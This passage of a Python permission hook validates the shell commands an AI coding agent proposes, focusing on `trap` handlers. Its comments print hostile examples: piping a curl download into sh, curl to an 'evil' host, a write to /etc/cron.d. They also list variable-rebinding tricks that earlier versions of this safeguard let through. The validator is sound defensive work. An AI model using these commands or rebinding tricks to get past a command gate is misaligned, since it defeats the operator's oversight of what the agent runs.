        2. NO candidate means ask. Once a collapse actually happened somewhere in
           `raw_command`, the handler's own token must turn up in the scan; if it
           does not, something about this command defeats the lookup (an
           unbalanced fragment, a re-tokenization failure, a normalization this
           method does not model) and there is no proof left to lean on.

        (Round 2 had a third rule — match modulo constant expansion — because the
        handler reached this method already expanded. It no longer does: the `$`
        rule in _trap_handler_verdict refuses every handler a constant could have
        been substituted into, so matching is literal again.)

        The one path that still returns the handler untouched is the one where
        nothing could have been lost: `raw_command` is already flat, or None
        because a caller did not thread it through.
        """
        if not raw_command or _collapse_whitespace(raw_command) == raw_command:
            return handler, True

        candidates = set(self._matching_raw_handler_tokens(handler, raw_command))

        if not candidates:
            debug_log(f"trap handler {handler!r} matches no raw token of "
                      f"{raw_command!r} though whitespace was collapsed - asking")
            return handler, False
        if len(candidates) == 1:
            recovered = candidates.pop()
            debug_log(f"trap handler recovered from raw source: {recovered!r}")
            return recovered, True
        debug_log(f"trap handler {handler!r} matches several raw spellings "
                  f"{sorted(candidates)!r} - asking")
        return handler, False

    def _trap_handler_verdict(self, cmd: str, function_defs: dict,
                              cmd_offset: int, depth: int = 0,
                              raw_command: str = None,
                              unexpanded_cmd: str = None):
        r"""
        Validate a `trap` handler as its own sub-command and return the verdict
        the whole `trap ...` sub-command inherits, or None when the trap
        registers no handler (the caller then applies the plain shortcut).

        The handler runs later, but it runs in THIS shell, with the same
        authority the command being gated has right now — so it is extracted and
        validated exactly the way a `$(…)` substitution already is. `trap 'curl …
        | sh' EXIT` therefore decides whatever `curl … | sh` decides.

        `function_defs`/`cmd_offset` are passed through so the common
        `cleanup() { …; }; trap cleanup EXIT` shape still resolves the handler to
        the locally defined function (whose body is validated separately).

        THE `$` RULE (task 28 §5, round 5; operator's decision). A handler whose
        RAW text — as written in the command, before this validator expanded
        anything — contains a `$` or a backtick cannot be vouched for, and asks.
        Both quoting regimes, unconditionally, with no dependence on whether an
        assignment to the name is visible, where it sits, or how it is spelled.

        The reason it has to be that blunt. What `trap` registers is a TEMPLATE,
        and this validator has no model of the environment it expands in. Four
        review rounds tried to keep the expansion and bound the damage by
        enumerating the ways a name can be rebound, and four rounds shipped a
        list with holes in it — a single-quoted handler binds at FIRE time, so
        every later write counts, and `const_assignments` only ever sees bare
        standalone `KEY=VALUE` statements:

            X=echo; trap '$X http://e/x' EXIT; X=curl          <- round 4 caught this one
            X=echo; trap '$X http://e/x' EXIT; export X=curl   <- and missed these six
            X=echo; trap '$X http://e/x' EXIT; declare X=curl
            X=echo; trap '$X http://e/x' EXIT; read X <<< curl
            X=echo; trap '$X http://e/x' EXIT; printf -v X curl
            X=echo; trap '$X http://e/x' EXIT; for X in curl; do :; done
            X=echo; trap '$X http://e/x' EXIT; f(){ X=curl; }; f

        A DOUBLE-quoted handler is expanded when `trap` runs, so modelling it at
        the registration offset looked exact — but only if the binding the
        validator resolves is the binding bash has, and an EARLIER rebind in a
        form the map cannot see shadows the one it can:

            X=echo; export X=curl;  trap "$X http://e/x" EXIT   <- registers `curl …`
            X=echo; declare X=curl; trap "$X http://e/x" EXIT   <- registers `curl …`

        Both measured `allow`. The class is closed here by construction rather
        than by list: no `$`, no backtick, no guess.

        A DENY still stands. The rule downgrades allow→ask, never deny→ask, so
        the handler's sub-commands are validated FIRST and a deny that is
        provable from the handler's literal text survives it (epic 22 invariant
        1, deny is final):

            X=/tmp/a; trap 'curl http://evil; echo $X' EXIT; X=/tmp/b   -> deny

        `curl http://evil` is a literal; what `$X` holds cannot make it safe.
        Because the sub-commands validated are the RAW ones, a deny can never
        come from an expansion instead — `X=curl; trap "$X http://e/x" EXIT`
        validates the head `$X`, which matches no pattern and asks, rather than
        the `curl` a guessed binding would have produced (round 3 MEDIUM 1, a
        false deny, stays fixed).

        Anything that cannot be parsed with confidence returns ASK, never allow
        (task 27 H2: an over-tight matcher is annoying, an over-loose one is the
        bug being fixed).
        """
        # The handler must be read out of the text the user wrote. `cmd` has had
        # its `$VAR` references replaced with literals by _expand_constants, and
        # a literal this validator chose is exactly what the `$` rule refuses to
        # decide on. `unexpanded_cmd` is that same sub-command before the
        # rewrite; reduce it the same way `cmd` was reduced so the two are token-
        # aligned (`VAR=x trap …`, `env trap …`, `if trap …` all peel).
        written = cmd if unexpanded_cmd is None \
            else self._reduce_to_effective_command(unexpanded_cmd)
        if _head_token(written) != 'trap':
            # Expansion is what made this a `trap` at all (`T=trap; $T "$X …"
            # EXIT`), so the invocation in front of us is not the one that was
            # written and its handler token cannot be located in the source.
            return self._trap_ask_result(written, 'trap_assembled_by_expansion')

        # Every verdict below is reported against `written` rather than `cmd`.
        # The prompt has to show the text the rule was read off: rendering
        # `X=echo; trap "$X http://e/x" EXIT; export X=curl` as
        # `trap 'echo http://e/x' EXIT` would put a harmless-looking command in
        # front of the operator and ask them to approve it, when the whole reason
        # for the prompt is that `echo` is a value this validator guessed.
        handler, confident = self._trap_handler(written)
        if not confident:
            return self._trap_ask_result(written, 'trap_handler_unparsed')
        if handler is None:
            return None

        # `source` reached us with its whitespace collapsed, which turns a
        # two-line handler into one line and hides everything after the first.
        # Put the newlines back before the handler is parsed (BLOCKER 1); when
        # the source cannot be pinned down unambiguously — including when it
        # cannot be pinned down at all — ask.
        handler, confident = self._recover_raw_handler(handler, raw_command)
        if not confident:
            return self._trap_ask_result(written, 'trap_handler_ambiguous_source')

        if depth >= 3:
            # A trap that registers a trap that registers a trap… stop unrolling
            # and prompt rather than guess.
            debug_log(f"trap handler nesting too deep for {written!r} - asking")
            return self._trap_ask_result(written, 'trap_handler_nested')

        try:
            parsed = self.parser.parse_with_offsets(handler)
        except (ValueError, IndexError, RecursionError) as e:
            debug_log(f"trap handler {handler!r} did not parse: {e}")
            return self._trap_ask_result(written, 'trap_handler_unparsed')
        if not parsed:
            debug_log(f"trap handler {handler!r} produced no sub-commands - asking")
            return self._trap_ask_result(written, 'trap_handler_unparsed')

        results = [
            self._check_single_command(sub, function_defs, cmd_offset,
                                       _trap_depth=depth + 1,
                                       raw_command=handler,
                                       unexpanded_cmd=sub)
            for sub, _off in parsed
        ]

        # The handler is validated "exactly the way a $(…) substitution already
        # is" (§2.2) — and that includes the write-redirect gate, which
        # _check_single_command does not apply (the parser strips redirect
        # targets before command matching, so validate_bash_command runs the gate
        # separately over the whole command). Without this the handler was the
        # one place a write could go anywhere unprompted: `trap 'echo ok >
        # /etc/cron.d/pwn' EXIT` allowed while both `echo ok > /etc/cron.d/pwn`
        # and `$(echo ok > /etc/cron.d/pwn)` asked (review finding HIGH 1).
        # A `$VAR` target is not resolved here and never will be — it falls to
        # the same literal-prefix rule and asks when it has no allowed anchor.
        disallowed_targets = _dedupe([
            target
            for target, _off in self.parser.extract_write_redirect_targets(handler)
            if not self._is_redirect_target_allowed(target)
        ])
        if disallowed_targets:
            debug_log(f"trap handler {handler!r} writes outside the allowed roots: "
                      f"{disallowed_targets}")
        matched_deny = _dedupe([p for r in results for p in r['matched_deny_patterns']])
        matched_ask = _dedupe([p for r in results for p in r['matched_ask_patterns']])

        # Deny first, and before the `$` rule: a deny read off the handler's own
        # literal text is provable whatever the environment holds, and epic 22
        # invariant 1 says deny is final. Round 4 asked here instead, which threw
        # a provable deny away (review MEDIUM).
        if any(r['denied'] for r in results):
            return {
                'command': written,
                'allowed': False,
                'denied': True,
                'asked': bool(matched_ask),
                'matched_allow_patterns': [],
                'matched_deny_patterns': matched_deny,
                'matched_ask_patterns': matched_ask
            }

        # THE `$` RULE. The registered handler is a template and this is where we
        # stop pretending to know what it expands to — see the docstring. It also
        # subsumes §2.3's runtime-assembly case: `trap "$(cat payload)" EXIT`
        # parses into the allowlisted `cat payload`, but what gets REGISTERED is
        # that file's contents, and `trap "$CMD" EXIT` registers whatever $CMD
        # holds. Validating the generator is not validating the handler.
        if any(ch in handler for ch in self._TRAP_EXPANSION_CHARS):
            return self._trap_ask_result(written, 'trap_handler_expansion')

        if (any(r.get('asked') for r in results)
                or not all(r['allowed'] for r in results)
                or disallowed_targets):
            return {
                'command': written,
                'allowed': False,
                'denied': False,
                'asked': bool(matched_ask),
                'matched_allow_patterns': [],
                'matched_deny_patterns': [],
                'matched_ask_patterns': matched_ask
            }
        # Handler fully allowed: the trap registration itself stays allowed.
        return None

    @staticmethod
    def _trap_ask_result(cmd: str, marker: str) -> Dict[str, Any]:
        """
        An ask verdict for a trap whose handler could not be vouched for.

        Reported as "neither allowed nor denied" rather than as an ask-PATTERN
        match, so the prompt says the honest thing ("Not in allowlist — review
        before approving: `trap ...`") instead of naming an operator pattern that
        never matched. `marker` names the reason in the debug log.
        """
        debug_log(f"trap {cmd!r} -> ask ({marker})")
        return {
            'command': cmd,
            'allowed': False,
            'denied': False,
            'asked': False,
            'matched_allow_patterns': [],
            'matched_deny_patterns': [],
            'matched_ask_patterns': []
        }

    def _matches_pattern(self, command: str, pattern: str) -> bool:
        """
        Check if command matches a Bash(...) pattern

        Args:
            command: Command string (e.g. "git diff file.txt")
            pattern: Pattern from settings (e.g. "Bash(git diff:*)")

        Returns:
            True if matches, False otherwise

        Examples:
            command='git diff file.txt', pattern='Bash(git diff:*)' → True
            command='git status', pattern='Bash(git diff:*)' → False
            command='pwd', pattern='Bash(pwd)' → True
        """
        # Only match Bash patterns
        if not pattern.startswith('Bash('):
            return False

        # Extract inner pattern from Bash(...)
        if not pattern.endswith(')'):
            return False

        inner = pattern[5:-1]  # Remove 'Bash(' and ')'

        # Check for wildcard suffix
        if inner.endswith(':*'):
            prefix = inner[:-2]
            # Prefix (wildcard) match, but only at a command-word boundary so a
            # command-name prefix does not bleed into a longer word: `Bash(tr:*)`
            # must match `tr -d x` but NOT `trap ...` or `truncate ...`. A bare
            # `command.startswith(prefix)` would wrongly green-light `trap` (and
            # likewise let a deny pattern over-match). We accept the match when:
            #   - the prefix IS the whole command (`tr`),
            #   - the char right after the prefix is whitespace (a new argument:
            #     `tr -d x`), or
            #   - the prefix ends in a non-alphanumeric separator, where
            #     continuing the same token is the intended behaviour — this
            #     preserves path/operator prefixes like `./:*`, `[:*`, `git log
            #     --oneline /tmp/:*`.
            if not command.startswith(prefix):
                matches = False
            elif len(command) == len(prefix):
                matches = True
            elif command[len(prefix)].isspace():
                matches = True
            elif not prefix[-1:].isalnum():
                matches = True
            else:
                matches = False
            debug_log(f"    Pattern {pattern!r}: prefix match {prefix!r} → {matches}")
            return matches
        else:
            # Exact match
            matches = command == inner
            debug_log(f"    Pattern {pattern!r}: exact match → {matches}")
            return matches


def main():
    """Main hook entry point"""

    # Check for replay mode (for testing edge cases)
    # Set CLAUDE_HOOK_REPLAY=1 or pass --replay flag via arguments
    if os.environ.get('CLAUDE_HOOK_REPLAY', '0') == '1':
        replay_from_log()
        return

    # Also check if we're being called with command-line args suggesting replay
    if len(sys.argv) > 1 and '--help' not in sys.argv:
        # If there are command line args, assume replay mode
        replay_from_log()
        return

    # Check if stdin looks like JSON log lines (replay mode detection)
    # Try to peek at first line to detect format
    # Note: We need to read all stdin since we can't seek on a pipe
    try:
        # Save the original stdin for potential replay use
        full_stdin = sys.stdin.read()
        sys.stdin = io.StringIO(full_stdin)

        if full_stdin:
            first_line = full_stdin.split('\n')[0]
            if first_line:
                # Try to parse as JSON - if it has 'command' field and no 'tool_name',
                # it's likely a log entry for replay
                try:
                    peek_entry = json.loads(first_line.strip())
                    if 'command' in peek_entry and 'tool_name' not in peek_entry:
                        # Looks like a log entry, use replay mode
                        # Pass the pre-read lines to replay_from_log
                        replay_from_log(full_stdin.splitlines())
                        return
                except json.JSONDecodeError:
                    # Not JSON, continue with normal hook mode
                    pass
    except Exception:
        # Can't peek, continue with normal hook mode
        pass

    try:
        # Read hook input from stdin
        raw_input = sys.stdin.read()
        debug_log(f"=== Hook called ===")
        debug_log(f"Raw input: {raw_input[:500]}...")  # First 500 chars

        input_data = json.loads(raw_input)
        debug_log(f"Parsed input: {json.dumps(input_data, indent=2)}")

        # Extract tool info
        tool_name = input_data.get('tool_name', '')
        tool_input = input_data.get('tool_input', {})

        # Extract session info for correlation
        session_id = input_data.get('session_id', '')

        # Process tools that execute a shell command. Bash is the obvious one;
        # Monitor is a built-in that runs an until-loop shell command and is
        # otherwise gated by Claude Code's own coarse heuristic (which, e.g.,
        # flags any `cd ...; ... > x` as a path-resolution bypass even for
        # `2>/dev/null`). Both carry the command in tool_input['command'], so the
        # same validator applies; an `allow` here bypasses that built-in prompt.
        if tool_name not in ('Bash', 'Monitor'):
            debug_log(f"Not a command-bearing tool (got {tool_name!r}), allowing")
            sys.exit(0)

        # Get command
        command = tool_input.get('command', '')
        if not command:
            debug_log("No command found, allowing")
            sys.exit(0)

        # Get workspace directory from the hook payload when available.
        workspace_dir = resolve_workspace_dir(input_data)
        debug_log(f"Workspace: {workspace_dir}")

        # Initialize components
        settings_loader = SettingsLoader(workspace_dir)
        parser = BashCommandParser()
        validator = BashPermissionValidator(settings_loader, parser, workspace_dir)

        # Validate command
        result = validator.validate_bash_command(command)

        debug_log(f"Validation result: {json.dumps(result, indent=2)}")

        # Log commands that were NOT auto-approved (ask or deny)
        # These require manual confirmation from the user
        if result['decision'] != 'allow':
            log_manual_confirmation(command, result, workspace_dir, session_id)

        # Make decision
        if result['decision'] == 'allow':
            # Explicitly allow - bypass normal permission system
            output = {
                'hookSpecificOutput': {
                    'hookEventName': 'PreToolUse',
                    'permissionDecision': 'allow'
                }
            }
            print(json.dumps(output))
            debug_log(f"ALLOWING command (bypassing normal permissions)")
            sys.exit(0)
        elif result['decision'] == 'deny':
            # Hard deny — matched a deny pattern; reason names the sub-command(s)
            # so the agent can reformulate. Flows back to the model via
            # permissionDecisionReason (H1 mitigation).
            output = {
                'hookSpecificOutput': {
                    'hookEventName': 'PreToolUse',
                    'permissionDecision': 'deny',
                    'permissionDecisionReason': result['reason'],
                }
            }
            print(json.dumps(output))
            debug_log(f"DENYING command: {result['reason']}")
            sys.exit(0)
        elif result['decision'] == 'ask':
            # Ask user via native Claude permission flow
            # This triggers the PermissionRequest hook for additional handling
            output = {
                'hookSpecificOutput': {
                    'hookEventName': 'PreToolUse',
                    'permissionDecision': 'ask',
                    'permissionDecisionReason': result['reason']
                }
            }
            print(json.dumps(output))
            debug_log(f"ASKING for permission: {result['reason']}")
            sys.exit(0)
        else:
            # Fallback (should not reach here normally)
            debug_log(f"Unexpected decision '{result['decision']}': {result['reason']}")
            sys.exit(0)

    except Exception as e:
        # On error, allow (fail open to avoid breaking things)
        debug_log(f"ERROR: {type(e).__name__}: {str(e)}")
        import traceback
        debug_log(f"Traceback:\n{traceback.format_exc()}")
        sys.exit(0)


if __name__ == '__main__':
    main()
